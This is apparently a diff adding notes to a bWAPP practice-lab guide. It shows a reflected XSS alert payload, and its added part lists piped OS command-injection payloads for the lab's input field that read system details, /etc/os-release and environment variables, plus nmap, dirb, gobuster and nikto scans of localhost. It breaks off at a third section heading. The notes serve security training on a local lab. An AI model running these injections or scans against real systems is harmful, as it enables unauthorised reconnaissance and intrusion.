@@ -9,3 +9,74 @@ Step 3: Open in Browser -  http://localhost/install.php
 3.Reflected XSS ->Go to: XSS → Reflected
                                 Payload: <script>alert('XSS')</script>
                                Shows alert if vulnerable
+
+
+1. OS Command Injection – Info Gathering Payloads
+Use these in the OS Command Injection module (target input field) of bWAPP (e.g., input: 127.0.0.1 | <payload>):
+
+🔹 System Info
+bash
+Copy
+Edit
+| uname -a           # Full system info
+| hostname           # Hostname of the system
+| cat /etc/os-release  # OS version (on modern Linux distros)
+🔹 Current User
+bash
+Copy
+Edit
+| whoami
+| id
+🔹 Running Processes
+bash
+Copy
+Edit
+| ps aux
+🔹 List Current Directory Files
+bash
+Copy
+Edit
+| ls -al
+🔹 List Environment Variables
+bash
+Copy
+Edit
+| env
+🔹 View Network Config
+bash
+Copy
+Edit
+| ifconfig        # May work in older systems
+| ip a            # Modern alternative
+🔹 Check Open Ports (if netstat is available)
+bash
+Copy
+Edit
+| netstat -tuln
+🌐 2. From Your Host System (Attacker Side)
+Assuming bWAPP is running on your local machine (localhost:80), you can run these from Kali Linux or any pentest distro:
+
+🔹 Port Scanning
+bash
+Copy
+Edit
+nmap -sS -sV -Pn -p- localhost
+🔹 Banner Grabbing (to identify server software)
+bash
+Copy
+Edit
+curl -I http://localhost
+🔹 Directory Bruteforce (with dirb or gobuster)
+bash
+Copy
+Edit
+dirb http://localhost/
+# or
+gobuster dir -u http://localhost/ -w /usr/share/wordlists/dirb/common.txt
+🔹 HTTP Info Gathering
+bash
+Copy
+Edit
+whatweb http://localhost
+nikto -h http://localhost
+🔑 3. bWAPP Application Info (Logged In)
